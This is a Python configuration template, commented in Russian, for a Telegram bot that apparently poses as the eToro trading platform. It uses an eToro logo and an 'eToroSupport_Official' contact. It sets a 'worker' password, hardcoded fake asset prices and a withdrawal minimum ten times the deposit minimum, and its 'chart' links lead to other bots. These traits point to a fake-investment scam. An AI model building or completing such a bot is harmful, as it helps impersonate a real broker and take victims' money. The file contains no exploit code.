"""
Конфигурация бота с использованием переменных окружения
Скопируйте этот файл в config.py и заполните значения
"""
import os
from pathlib import Path
from dotenv import load_dotenv
import hashlib

# Загружаем переменные из .env
load_dotenv()


class Config:
    """Конфигурация приложения"""
    
    # Токен бота (ОБЯЗАТЕЛЬНО)
    BOT_TOKEN = os.getenv("BOT_TOKEN")
    
    # Хеш пароля воркера (используйте hashlib.sha256(b"your_password").hexdigest())
    WORKER_PASSWORD_HASH = os.getenv("WORKER_PASSWORD_HASH")
    
    # Базовая директория
    BASE_DIR = Path(__file__).parent
    
    # Пути к ресурсам
    PHOTO_PATH = BASE_DIR / "etoro.png"
    PROFILE_PHOTO_PATH = BASE_DIR / "image copy.png"
    TRADING_PHOTO_PATH = BASE_DIR / "image copy.png"
    
    # База данных
    DATABASE_URL = os.getenv("DATABASE_URL", "sqlite+aiosqlite:///bot.db")
    
    # Логирование
    LOG_LEVEL = os.getenv("LOG_LEVEL", "INFO")
    LOG_FILE = BASE_DIR / "logs" / "bot.log"
    
    # Rate limiting
    RATE_LIMIT_MESSAGES = int(os.getenv("RATE_LIMIT_MESSAGES", "5"))  # сообщений
    RATE_LIMIT_PERIOD = int(os.getenv("RATE_LIMIT_PERIOD", "60"))  # секунд
    
    # Timeout для состояний (секунды)
    STATE_TIMEOUT = int(os.getenv("STATE_TIMEOUT", "300"))  # 5 минут
    
    # Минимальные суммы
    MIN_DEPOSIT = float(os.getenv("MIN_DEPOSIT", "100.0"))
    MIN_WITHDRAW = float(os.getenv("MIN_WITHDRAW", "1000.0"))
    MIN_TRADE_AMOUNT = float(os.getenv("MIN_TRADE_AMOUNT", "1.0"))
    
    # Поддержка
    SUPPORT_USERNAME = os.getenv("SUPPORT_USERNAME", "eToroSupport_Official")
    
    # Данные для торговли
    CRYPTO_CURRENCIES = [
        "₿ Bitcoin (BTC)", "Ξ Ethereum (ETH)", "₮ Tether (USDT)", "₿ Bitcoin Cash (BCH)",
        "Ł Litecoin (LTC)", "◊ Cardano (ADA)", "◊ Polkadot (DOT)", "◊ Chainlink (LINK)",
        "◊ Stellar (XLM)", "◊ Uniswap (UNI)"
    ]
    
    RUSSIAN_STOCKS = [
        "🛢️ Газпром (GAZP)", "🛢️ Лукойл (LKOH)", "🏦 Сбербанк (SBER)", "⚡ Россети (RSTI)",
        "🏭 Норникель (GMKN)", "🛢️ Татнефть (TATN)", "🏭 НЛМК (NLMK)", "🏭 Северсталь (CHMF)",
        "🏭 ММК (MAGN)", "🏭 АЛРОСА (ALRS)"
    ]
    
    COMMODITIES = [
        "🥇 Золото (GOLD)", "🥈 Серебро (SILVER)", "🛢️ Нефть Brent (OIL)", "⛽ Природный газ (GAS)",
        "🌾 Пшеница (WHEAT)", "🌽 Кукуруза (CORN)", "☕ Кофе (COFFEE)", "🍫 Какао (COCOA)",
        "🥜 Соевые бобы (SOYBEAN)", "🍯 Сахар (SUGAR)"
    ]
    
    ASSET_PRICES = {
        # Криптовалюты (в рублях)
        "₿ Bitcoin (BTC)": 111700, "Ξ Ethereum (ETH)": 4300, "₮ Tether (USDT)": 1.00,
        "₿ Bitcoin Cash (BCH)": 450, "Ł Litecoin (LTC)": 85, "◊ Cardano (ADA)": 0.45,
        "◊ Polkadot (DOT)": 5.50, "◊ Chainlink (LINK)": 15.20, "◊ Stellar (XLM)": 0.12,
        "◊ Uniswap (UNI)": 9.80,
        # Российские акции (в рублях)
        "🛢️ Газпром (GAZP)": 180, "🛢️ Лукойл (LKOH)": 7200,
        "🏦 Сбербанк (SBER)": 280, "⚡ Россети (RSTI)": 1.2, "🏭 Норникель (GMKN)": 18000,
        "🛢️ Татнефть (TATN)": 4200, "🏭 НЛМК (NLMK)": 180, "🏭 Северсталь (CHMF)": 1200,
        "🏭 ММК (MAGN)": 45, "🏭 АЛРОСА (ALRS)": 120,
        # Сырьевые товары (в рублях)
        "🥇 Золото (GOLD)": 6500, "🥈 Серебро (SILVER)": 85, "🛢️ Нефть Brent (OIL)": 6500,
        "⛽ Природный газ (GAS)": 120, "🌾 Пшеница (WHEAT)": 18000, "🌽 Кукуруза (CORN)": 15000,
        "☕ Кофе (COFFEE)": 450, "🍫 Какао (COCOA)": 280, "🥜 Соевые бобы (SOYBEAN)": 35000,
        "🍯 Сахар (SUGAR)": 65
    }
    
    # Графики
    CRYPTO_CHART_URLS = {
        "₿ Bitcoin (BTC)": "https://t.me/AdelHistoryBot/vvkhjvkvllkj",
        "Ξ Ethereum (ETH)": "https://t.me/sell_bit_bot/httpscrm1nqbdonrendercom",
        "₮ Tether (USDT)": "https://t.me/sell_bit_bot/httpscrm1nqbdonrendercom",
        "₿ Bitcoin Cash (BCH)": "https://t.me/AdelHistoryBot/vvkhjvkvllkj",
        "Ł Litecoin (LTC)": "https://t.me/sell_bit_bot/httpscrm1nqbdonrendercom",
        "◊ Cardano (ADA)": "https://t.me/AdelHistoryBot/vvkhjvkvllkj",
        "◊ Polkadot (DOT)": "https://t.me/sell_bit_bot/httpscrm1nqbdonrendercom",
        "◊ Chainlink (LINK)": "https://t.me/AdelHistoryBot/vvkhjvkvllkj",
        "◊ Stellar (XLM)": "https://t.me/sell_bit_bot/httpscrm1nqbdonrendercom",
        "◊ Uniswap (UNI)": "https://t.me/AdelHistoryBot/vvkhjvkvllkj"
    }
    
    STOCK_CHART_URLS = [
        "https://t.me/AdelHistoryBot/vvkhjvkvllkj",
        "https://t.me/sell_bit_bot/httpscrm1nqbdonrendercom",
    ]
    
    COMMODITY_CHART_URLS = [
        "https://t.me/AdelHistoryBot/vvkhjvkvllkj",
        "https://t.me/sell_bit_bot/httpscrm1nqbdonrendercom",
    ]
    
    @classmethod
    def validate(cls):
        """Проверяет обязательные параметры конфигурации"""
        if not cls.BOT_TOKEN:
            raise ValueError("BOT_TOKEN must be set in environment variables")
        if not cls.WORKER_PASSWORD_HASH:
            raise ValueError("WORKER_PASSWORD_HASH must be set in environment variables")
        
        # Создаём директорию для логов
        cls.LOG_FILE.parent.mkdir(parents=True, exist_ok=True)
    
    @staticmethod
    def hash_password(password: str) -> str:
        """Хеширует пароль с использованием SHA-256"""
        return hashlib.sha256(password.encode()).hexdigest()
    
    @classmethod
    def verify_password(cls, password: str) -> bool:
        """Проверяет пароль"""
        return cls.hash_password(password) == cls.WORKER_PASSWORD_HASH
